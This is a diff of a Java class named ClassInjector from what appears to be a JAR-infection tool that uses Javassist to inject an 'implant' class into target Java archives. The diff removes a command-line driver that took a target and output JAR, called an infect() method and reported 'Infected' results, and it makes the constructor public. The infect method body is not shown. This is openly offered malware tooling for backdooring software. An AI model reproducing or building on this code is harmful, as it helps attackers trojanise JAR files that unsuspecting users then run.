@@ -2,13 +2,11 @@ package org.example.injector;
 
 import javassist.CtClass;
 import javassist.bytecode.*;
-import org.example.implants.ClassImplant;
 
 import java.io.DataInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
-import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.jar.JarEntry;
 
@@ -18,37 +16,8 @@ public class ClassInjector {
     final static String IMPLANT_CLASS_NAME = "Init";
     private final Class<?> implantClass;
 
-    ClassInjector(Class<?> implantClass) {
+    public ClassInjector(Class<?> implantClass) {
         this.implantClass = implantClass;
-    }
-
-    public static void main(String[] args) {
-        if (args.length < 2) {
-            System.exit(1);
-        }
-
-        ClassInjector injector = new ClassInjector(ClassImplant.class);
-        try {
-            Path targetPath = Path.of(args[0]);
-            Path outputPath = Path.of(args[1]);
-            System.out.println("[i] Target JAR: " + targetPath);
-            System.out.println("[i] Output JAR: " + outputPath);
-            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
-                System.out.println("[!] Target JAR is not a regular existing file.");
-                System.exit(1);
-            }
-            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
-                System.out.println("[-] Target JAR and output JAR cannot be the same.");
-                System.exit(1);
-            }
-            if (injector.infect(targetPath, outputPath)) {
-                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
-            } else {
-                System.out.println("[-] Did not infect '" + targetPath + "'.");
-            }
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        }
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
